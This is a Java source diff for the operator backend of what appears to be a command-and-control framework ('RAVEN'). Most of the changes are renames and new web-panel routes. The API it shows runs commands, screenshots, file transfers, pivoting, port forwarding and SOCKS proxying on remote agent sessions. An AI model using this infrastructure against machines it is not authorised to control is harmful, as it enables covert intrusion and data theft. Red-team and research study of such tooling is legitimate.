@@ -21,15 +21,14 @@ import com.sun.net.httpserver.*;
 import java.io.*;
 import java.net.*;
 import java.time.*;
-import java.time.format.DateTimeFormatter;
 import java.util.*;
 import java.util.concurrent.*;
 
 public final class TeamServer {
 
-    private static final long TOKEN_TTL_MS = 8L * 60 * 60 * 1000;
-    private static final int MAX_CHAT = 500;
-    private static final String MEDIA_JSON = "application/json";
+    private static final long TokenTtlMs = 8L * 60 * 60 * 1000;
+    private static final int MaxChatSize = 500;
+    private static final String JsonContentType = "application/json";
 
     @FunctionalInterface
     private interface RouteHandler {
@@ -66,6 +65,7 @@ public final class TeamServer {
         HttpSrv = HttpServer.create(new InetSocketAddress(Host, Port), 128);
         Router = new HttpRouter(HttpSrv, Config, PathResolver);
         RegisterRoutes();
+        Router.RegisterStatic();
         HttpSrv.setExecutor(Executors.newFixedThreadPool(32));
         HttpSrv.start();
         Logger.Info("TeamServer web panel : http://" + Host + ":" + Port + "/");
@@ -73,11 +73,64 @@ public final class TeamServer {
         Log.Add("TeamServer initialized — mode: " + Mode.name());
     }
 
+    private volatile boolean WebPanelEnabled = false;
+
+    private String ApiWebPanelStart(HttpExchange Exchange, AuthApi.TokenInfo Token) throws Exception {
+        if (!Token.Role().CanWrite()) return HttpHelper.Json(Map.of("Error", "insufficient permissions"));
+        if (Router == null) return HttpHelper.Json(Map.of("Error", "server not initialized"));
+        if (WebPanelEnabled) return HttpHelper.Json(Map.of("Error", "web panel already running"));
+        try {
+            Router.RegisterStatic();
+            WebPanelEnabled = true;
+            String ServerAddress = Exchange.getLocalAddress().getHostName() + ":" + Exchange.getLocalAddress().getPort();
+            Logger.Info("Web panel enabled on http://" + ServerAddress + "/ by " + Token.Username());
+            return HttpHelper.Json(Map.of("Success", true, "URL", "http://" + ServerAddress + "/"));
+        } catch (Exception Ex) {
+            return HttpHelper.Json(Map.of("Error", "web panel enable failed: " + Ex.getMessage()));
+        }
+    }
+
+    private String ApiWebPanelStop(HttpExchange Exchange, AuthApi.TokenInfo Token) throws Exception {
+        if (!Token.Role().CanWrite()) return HttpHelper.Json(Map.of("Error", "insufficient permissions"));
+        Logger.Info("Web panel stop requested by " + Token.Username());
+        return HttpHelper.Json(Map.of("Success", true, "Message", "web panel stop not implemented in embedded mode"));
+    }
+
+    private String ApiWebPanelStatus(HttpExchange Exchange, AuthApi.TokenInfo Token) throws Exception {
+        return HttpHelper.Json(Map.of("Running", false, "Mode", "embedded-api"));
+    }
+
+    private String ApiTasks(HttpExchange Exchange, AuthApi.TokenInfo Token) throws Exception {
+        return HttpHelper.Json(Map.of("Tasks", List.of()));
+    }
+
     public void Stop() {
         if (Server != null) Server.StopServer();
         if (HttpSrv != null) HttpSrv.stop(1);
         Db.Close();
         Logger.Shutdown();
+    }
+
+    public void RunAsBackend(String AgentHost, int AgentPort, String ApiHost, int ApiPort) throws Exception {
+        Server = new RavenServer(AgentHost, AgentPort, Mode, Config);
+        Server.AddEventListener(this::OnEvent);
+        boolean[] Started = Server.StartServer();
+        if (!Started[0]) throw new Exception("failed to start agent listener on " + AgentHost + ":" + AgentPort);
+        ServerStartTime = Instant.now();
+        Thread AcceptThread = new Thread(Server::AcceptConnections, "AcceptConnections");
+        AcceptThread.setDaemon(true);
+        AcceptThread.start();
+        HttpSrv = HttpServer.create(new InetSocketAddress(ApiHost, ApiPort), 128);
+        Router = new HttpRouter(HttpSrv, Config, PathResolver);
+        RegisterRoutes();
+        HttpSrv.setExecutor(Executors.newFixedThreadPool(32));
+        HttpSrv.start();
+        Logger.Info("RAVEN TeamServer backend running:");
+        Logger.Info("  Agent listener : " + AgentHost + ":" + AgentPort + " [" + Mode.name() + "]");
+        Logger.Info("  Operator API   : http://" + ApiHost + ":" + ApiPort + "/api/");
+        Logger.Info("  Connect CLI    : java -jar raven.jar -TSC -ts " + ApiHost + " -tp " + ApiPort);
+        Logger.Info("  Connect Web    : java -jar raven.jar -TSW -ts " + ApiHost + " -tp " + ApiPort);
+        Log.Add("TeamServer backend initialized — mode: " + Mode.name());
     }
 
     private void RegisterRoutes() {
@@ -127,12 +180,17 @@ public final class TeamServer {
         route("/api/team/operators/kick", this::ApiOpKick, true);
         route("/api/team/roles", this::ApiRoles, true);
 
+        // web panel control
+        route("/api/server/webpanel/start",  this::ApiWebPanelStart,  true);
+        route("/api/server/webpanel/stop",   this::ApiWebPanelStop,   true);
+        route("/api/server/webpanel/status", this::ApiWebPanelStatus, true);
+        route("/api/tasks",                  this::ApiTasks,          true);
+
         // team — chat
         route("/api/team/chat/send", this::ApiChatSend, true);
         route("/api/team/chat/messages", this::ApiChatMessages, true);
         route("/api/team/chat/logs", this::ApiChatLogs, true);
 
-        Router.RegisterStatic();
     }
 
     private void route(String Path, RouteHandler H, boolean Auth) {
@@ -156,7 +214,7 @@ public final class TeamServer {
             }
             String Result = H.Handle(E, T);
             byte[] Bytes = Result.getBytes("UTF-8");
-            E.getResponseHeaders().set("Content-Type", MEDIA_JSON);
+            E.getResponseHeaders().set("Content-Type", JsonContentType);
             E.getResponseHeaders().set("X-Content-Type-Options", "nosniff");
             E.sendResponseHeaders(200, Bytes.length);
             try (OutputStream Out = E.getResponseBody()) {
@@ -171,7 +229,7 @@ public final class TeamServer {
 
     private void Respond(HttpExchange E, int Status, Object Body) throws IOException {
         byte[] Bytes = HttpHelper.Json(Body).getBytes("UTF-8");
-        E.getResponseHeaders().set("Content-Type", MEDIA_JSON);
+        E.getResponseHeaders().set("Content-Type", JsonContentType);
         E.sendResponseHeaders(Status, Bytes.length);
         try (OutputStream Out = E.getResponseBody()) {
             Out.write(Bytes);
@@ -188,12 +246,12 @@ public final class TeamServer {
         }
     }
 
-    private String S(Map<String, Object> M, String K, String Def) {
-        return HttpHelper.Str(M, K, Def);
+    private String Str(Map<String, Object> DataMap, String Key, String Default) {
+        return HttpHelper.Str(DataMap, Key, Default);
     }
 
-    private int N(Map<String, Object> M, String K, int Def) {
-        return HttpHelper.Num(M, K, Def);
+    private int Num(Map<String, Object> DataMap, String Key, int Default) {
+        return HttpHelper.Num(DataMap, Key, Default);
     }
 
     private void AddLog(String Msg) {
@@ -210,17 +268,17 @@ public final class TeamServer {
 
     private String ApiAuthLogin(HttpExchange E, TokenInfo Ignored) throws Exception {
         Map<String, Object> B = Body(E);
-        String User = S(B, "Username", "");
-        String Pass = S(B, "Password", "");
+        String User = Str(B, "Username", "");
+        String Pass = Str(B, "Password", "");
         if (User.isEmpty() || Pass.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Password required"));
         if (!Db.ValidateOperator(User, TeamDatabase.HashPassword(Pass))) return HttpHelper.Json(Map.of("Error", "Invalid credentials"));
         OperatorRole Role = Db.GetOperatorRole(User);
         Db.UpdateLastSeen(User);
         String Token = UUID.randomUUID().toString().replace("-", "");
-        Tokens.put(Token, new TokenInfo(User, Role, System.currentTimeMillis() + TOKEN_TTL_MS));
+        Tokens.put(Token, new TokenInfo(User, Role, System.currentTimeMillis() + TokenTtlMs));
         Logger.Info("[AUTH] Login: " + User + " [" + Role + "]");
         AddLog("[AUTH] Login: " + User + " [" + Role + "]");
-        return HttpHelper.Json(Map.of("Token", Token, "Role", Role.name(), "Username", User, "Permissions", Role.PermissionString(), "ExpiresIn", TOKEN_TTL_MS / 1000));
+        return HttpHelper.Json(Map.of("Token", Token, "Role", Role.name(), "Username", User, "Permissions", Role.PermissionString(), "ExpiresIn", TokenTtlMs / 1000));
     }
 
     private String ApiAuthLogout(HttpExchange E, TokenInfo T) throws Exception {
@@ -257,8 +315,8 @@ public final class TeamServer {
         if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
         if (Server != null && Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server already running"));
         Map<String, Object> B = Body(E);
-        String Host = S(B, "Host", Config.GetServerHost());
-        int Port = N(B, "Port", Config.GetServerPort());
+        String Host = Str(B, "Host", Config.GetServerHost());
+        int Port = Num(B, "Port", Config.GetServerPort());
         Server = new RavenServer(Host, Port, Mode, Config);
         Server.AddEventListener(this::OnEvent);
         if (!Server.StartServer()[0]) return HttpHelper.Json(Map.of("Error", "Failed to start listener"));
@@ -309,7 +367,7 @@ public final class TeamServer {
     private String ApiAgentKill(HttpExchange E, TokenInfo T) throws Exception {
         if (!T.Role().CanKillSession()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
         if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
-        int Id = N(Body(E), "AgentId", 0);
+        int Id = Num(Body(E), "AgentId", 0);
         if (Id == 0) return HttpHelper.Json(Map.of("Error", "AgentId required"));
         Server.RemoveSession(Id);
         AddLog("[KILL] session-" + Id + " by " + T.Username());
@@ -318,8 +376,8 @@ public final class TeamServer {
 
     private String ApiAgentNote(HttpExchange E, TokenInfo T) throws Exception {
         Map<String, Object> B = Body(E);
-        int Id = N(B, "AgentId", 0);
-        String Note = S(B, "Note", "");
+        int Id = Num(B, "AgentId", 0);
+        String Note = Str(B, "Note", "");
         if (Id == 0) return HttpHelper.Json(Map.of("Error", "AgentId required"));
         Db.SetAgentNote(Id, Note);
         return HttpHelper.Json(Map.of("Success", true));
@@ -335,8 +393,8 @@ public final class TeamServer {
         if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
         if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
         Map<String, Object> B = Body(E);
-        int Id = N(B, "AgentId", 0);
-        String Cmd = S(B, "Command", "");
+        int Id = Num(B, "AgentId", 0);
+        String Cmd = Str(B, "Command", "");
         if (Id == 0 || Cmd.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Command required"));
         AddLog("[>] [" + T.Username() + "] session-" + Id + " » " + Cmd);
         String[] R = Server.ExecuteCommand(Id, Cmd);
@@ -349,7 +407,7 @@ public final class TeamServer {
         if (!T.Role().CanBroadcast()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
         if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
         Map<String, Object> B = Body(E);
-        String Cmd = S(B, "Command", "");
+        String Cmd = Str(B, "Command", "");
         if (Cmd.isEmpty()) return HttpHelper.Json(Map.of("Error", "Command required"));
         @SuppressWarnings("unchecked")
         List<Object> Raw = (List<Object>) B.getOrDefault("AgentIds", List.of());
@@ -366,7 +424,7 @@ public final class TeamServer {
     private String ApiCmdBroadcastAll(HttpExchange E, TokenInfo T) throws Exception {
         if (!T.Role().CanBroadcast()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
         if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
-        String Cmd = S(Body(E), "Command", "");
+        String Cmd = Str(Body(E), "Command", "");
         if (Cmd.isEmpty()) return HttpHelper.Json(Map.of("Error", "Command required"));
         AddLog("[BROADCAST-ALL] [" + T.Username() + "] > " + Server.GetSessions().Count() + " agents » " + Cmd);
         return BuildBroadcastResult(Server.BroadcastAll(Cmd), T.Username(), Cmd);
@@ -384,7 +442,7 @@ public final class TeamServer {
 
     private String ApiCmdScreenshot(HttpExchange E, TokenInfo T) throws Exception {
         if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
-        int Id = N(Body(E), "AgentId", 0);
+        int Id = Num(Body(E), "AgentId", 0);
         if (Id == 0 || Server == null) return HttpHelper.Json(Map.of("Error", "AgentId required"));
         String[] R = Server.ExecuteCommand(Id, "screenshot");
         boolean Ok = Boolean.parseBoolean(R[0]);
@@ -395,8 +453,8 @@ public final class TeamServer {
     private String ApiCmdDownload(HttpExchange E, TokenInfo T) throws Exception {
         if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
         Map<String, Object> B = Body(E);
-        int Id = N(B, "AgentId", 0);
-        String Path = S(B, "Path", "");
+        int Id = Num(B, "AgentId", 0);
+        String Path = Str(B, "Path", "");
         if (Id == 0 || Path.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Path required"));
         String[] R = Server.ExecuteCommand(Id, "download " + Path);
         boolean Ok = Boolean.parseBoolean(R[0]);
@@ -407,9 +465,9 @@ public final class TeamServer {
     private String ApiCmdUpload(HttpExchange E, TokenInfo T) throws Exception {
         if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
         Map<String, Object> B = Body(E);
-        int Id = N(B, "AgentId", 0);
-        String Local = S(B, "LocalPath", "");
-        String Remote = S(B, "RemotePath", "");
+        int Id = Num(B, "AgentId", 0);
+        String Local = Str(B, "LocalPath", "");
+        String Remote = Str(B, "RemotePath", "");
         if (Id == 0 || Local.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and LocalPath required"));
         String[] R = Server.ExecuteCommand(Id, "upload " + Local + (Remote.isEmpty() ? "" : " " + Remote));
         boolean Ok = Boolean.parseBoolean(R[0]);
@@ -419,8 +477,8 @@ public final class TeamServer {
 
     private String ApiCmdSleep(HttpExchange E, TokenInfo T) throws Exception {
         Map<String, Object> B = Body(E);
-        int Id = N(B, "AgentId", 0);
-        String Secs = S(B, "Seconds", "");
+        int Id = Num(B, "AgentId", 0);
+        String Secs = Str(B, "Seconds", "");
         if (Id == 0 || Secs.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Seconds required"));
         String[] R = Server.ExecuteCommand(Id, "sleep " + Secs);
         return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
@@ -428,8 +486,8 @@ public final class TeamServer {
 
     private String ApiCmdPivot(HttpExchange E, TokenInfo T) throws Exception {
         Map<String, Object> B = Body(E);
-        int Id = N(B, "AgentId", 0);
-        String Target = S(B, "Target", "");
+        int Id = Num(B, "AgentId", 0);
+        String Target = Str(B, "Target", "");
         if (Id == 0 || Target.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Target required"));
         String[] R = Server.ExecuteCommand(Id, "pivot " + Target);
         return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
@@ -437,10 +495,10 @@ public final class TeamServer {
 
     private String ApiCmdPortfwd(HttpExchange E, TokenInfo T) throws Exception {
         Map<String, Object> B = Body(E);
-        int Id = N(B, "AgentId", 0);
-        int Lport = N(B, "Lport", 0);
-        String Rhost = S(B, "Rhost", "");
-        int Rport = N(B, "Rport", 0);
+        int Id = Num(B, "AgentId", 0);
+        int Lport = Num(B, "Lport", 0);
+        String Rhost = Str(B, "Rhost", "");
+        int Rport = Num(B, "Rport", 0);
         if (Id == 0 || Lport == 0 || Rhost.isEmpty() || Rport == 0) return HttpHelper.Json(Map.of("Error", "AgentId, Lport, Rhost, Rport required"));
         String[] R = Server.ExecuteCommand(Id, "portfwd " + Lport + " " + Rhost + " " + Rport);
         return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
@@ -448,8 +506,8 @@ public final class TeamServer {
 
     private String ApiCmdSocks(HttpExchange E, TokenInfo T) throws Exception {
         Map<String, Object> B = Body(E);
-        int Id = N(B, "AgentId", 0);
-        int Lport = N(B, "Lport", 0);
+        int Id = Num(B, "AgentId", 0);
+        int Lport = Num(B, "Lport", 0);
         if (Id == 0 || Lport == 0) return HttpHelper.Json(Map.of("Error", "AgentId and Lport required"));
         String[] R = Server.ExecuteCommand(Id, "socks " + Lport);
         return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
@@ -457,13 +515,13 @@ public final class TeamServer {
 
     private String ApiCmdHistory(HttpExchange E, TokenInfo T) throws Exception {
         Map<String, Object> B = Body(E);
-        return HttpHelper.Json(Map.of("History", Db.GetCommandHistory(N(B, "AgentId", 0), N(B, "Limit", 100))));
+        return HttpHelper.Json(Map.of("History", Db.GetCommandHistory(Num(B, "AgentId", 0), Num(B, "Limit", 100))));
     }
 
     //  SESSIONS
 
     private String ApiSessionHistory(HttpExchange E, TokenInfo T) throws Exception {
-        int Limit = N(Body(E), "Limit", 100);
+        int Limit = Num(Body(E), "Limit", 100);
         return HttpHelper.Json(Map.of("Sessions", Db.GetSessionHistory(Math.min(Limit, 1000))));
     }
 
@@ -477,8 +535,8 @@ public final class TeamServer {
 
     private String ApiExport(HttpExchange E, TokenInfo T) throws Exception {
         Map<String, Object> B = Body(E);
-        String Target = S(B, "Target", "");
-        String Format = S(B, "Format", "json");
+        String Target = Str(B, "Target", "");
+        String Format = Str(B, "Format", "json");
         if (Target.isEmpty()) return HttpHelper.Json(Map.of("Error", "Target required"));
         Export.Run(Target, Format);
         return HttpHelper.Json(Map.of("Success", true, "Target", Target, "Format", Format));
@@ -494,9 +552,9 @@ public final class TeamServer {
     private String ApiOpCreate(HttpExchange E, TokenInfo T) throws Exception {
         if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
         Map<String, Object> B = Body(E);
-        String User = S(B, "Username", "");
-        String Pass = S(B, "Password", "");
-        String Role = S(B, "Role", "OPERATOR");
+        String User = Str(B, "Username", "");
+        String Pass = Str(B, "Password", "");
+        String Role = Str(B, "Role", "OPERATOR");
         if (User.isEmpty() || Pass.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Password required"));
         if (Pass.length() < 8) return HttpHelper.Json(Map.of("Error", "Password must be at least 8 characters"));
         OperatorRole R = OperatorRole.FromString(Role);
@@ -508,7 +566,7 @@ public final class TeamServer {
 
     private String ApiOpDelete(HttpExchange E, TokenInfo T) throws Exception {
         if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
-        String User = S(Body(E), "Username", "");
+        String User = Str(Body(E), "Username", "");
         if (User.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username required"));
         if (User.equalsIgnoreCase(Config.GetAdminUsername())) return HttpHelper.Json(Map.of("Error", "Cannot delete admin"));
         if (!Db.DeleteOperator(User)) return HttpHelper.Json(Map.of("Error", "Operator not found"));
@@ -519,8 +577,8 @@ public final class TeamServer {
     private String ApiOpRole(HttpExchange E, TokenInfo T) throws Exception {
         if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
         Map<String, Object> B = Body(E);
-        String User = S(B, "Username", "");
-        String Role = S(B, "Role", "");
+        String User = Str(B, "Username", "");
+        String Role = Str(B, "Role", "");
         if (User.isEmpty() || Role.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Role required"));
         if (User.equalsIgnoreCase(Config.GetAdminUsername())) return HttpHelper.Json(Map.of("Error", "Cannot change admin role"));
         OperatorRole R = OperatorRole.FromString(Role);
@@ -532,8 +590,8 @@ public final class TeamServer {
     private String ApiOpPassword(HttpExchange E, TokenInfo T) throws Exception {
         if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
         Map<String, Object> B = Body(E);
-        String User = S(B, "Username", "");
-        String Pass = S(B, "Password", "");
+        String User = Str(B, "Username", "");
+        String Pass = Str(B, "Password", "");
         if (User.isEmpty() || Pass.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Password required"));
         if (Pass.length() < 8) return HttpHelper.Json(Map.of("Error", "Password must be at least 8 characters"));
         if (!Db.UpdateOperatorPassword(User, TeamDatabase.HashPassword(Pass))) return HttpHelper.Json(Map.of("Error", "Operator not found"));
@@ -543,7 +601,7 @@ public final class TeamServer {
 
     private String ApiOpKick(HttpExchange E, TokenInfo T) throws Exception {
         if (!T.Role().CanKickOperator()) return HttpHelper.Json(Map.of("Error", "SUPER role required"));
-        String User = S(Body(E), "Username", "");
+        String User = Str(Body(E), "Username", "");
         if (User.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username required"));
         if (User.equalsIgnoreCase(Config.GetAdminUsername())) return HttpHelper.Json(Map.of("Error", "Cannot kick admin"));
         if (User.equals(T.Username())) return HttpHelper.Json(Map.of("Error", "Cannot kick yourself"));
@@ -575,16 +633,16 @@ public final class TeamServer {
 
     private String ApiChatSend(HttpExchange E, TokenInfo T) throws Exception {
         Map<String, Object> B = Body(E);
-        String Msg = S(B, "Message", "");
-        String To = S(B, "To", "all");
+        String Msg = Str(B, "Message", "");
+        String To = Str(B, "To", "all");
         if (Msg.isEmpty()) return HttpHelper.Json(Map.of("Error", "Message required"));
         Map<String, Object> Entry = new LinkedHashMap<>();
         Entry.put("From", T.Username());
         Entry.put("To", To);
         Entry.put("Message", Msg);
-        Entry.put("Time", LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")));
+        Entry.put("Timestamp", LocalTime.now().format(RavenConstants.TimestampFmt));
         Chat.add(Entry);
-        if (Chat.size() > MAX_CHAT) Chat.remove(0);
+        if (Chat.size() > MaxChatSize) Chat.remove(0);
         Db.SaveChatLog(T.Username(), To, Msg);
         return HttpHelper.Json(Map.of("Success", true));
     }
@@ -601,7 +659,7 @@ public final class TeamServer {
     }
 
     private String ApiChatLogs(HttpExchange E, TokenInfo T) throws Exception {
-        int Limit = N(Body(E), "Limit", 100);
+        int Limit = Num(Body(E), "Limit", 100);
         return HttpHelper.Json(Map.of("Logs", Db.GetChatLogs(Math.min(Limit, 1000))));
     }
 
